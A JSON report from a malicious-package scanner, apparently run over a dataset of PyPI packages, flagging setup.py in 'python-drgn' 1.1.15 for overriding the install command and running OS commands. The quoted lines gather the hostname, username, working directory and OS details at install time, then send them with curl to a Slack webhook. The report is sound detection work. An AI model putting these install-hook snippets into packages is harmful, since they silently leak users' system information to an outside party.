@@ -1,0 +1,60 @@
+{
+    "issues": 8,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:40",
+                "code": "setup(name='python-drgn', version='1.1.15',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': test})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "\t\t    \tconf=os.popen('uname -a').read().strip('\\n')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:21",
+                "code": "\t\t\tconf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:26",
+                "code": "  \t\t\tconf=os.popen('sysinfo').read() \n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:30",
+                "code": "\t\twho=(os.popen('whoami').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:32",
+                "code": "\t\thostn=(os.popen('hostname').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:34",
+                "code": "\t\tpwd=(os.popen('pwd').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:37",
+                "code": "\t\tos.system('curl -X POST -H \\'Content-type: application/json\\' --data \\'{\\\"text\\\": \\\"FILE_NAME: %s HOSTNAME: %s WHOAMI: %s PWD: %s OS_INFO: %s\\\"}\\' https://hooks.slack.com/services/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' %(file,hos...d,conf)) \n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/python-drgn-1.1.15"
+}
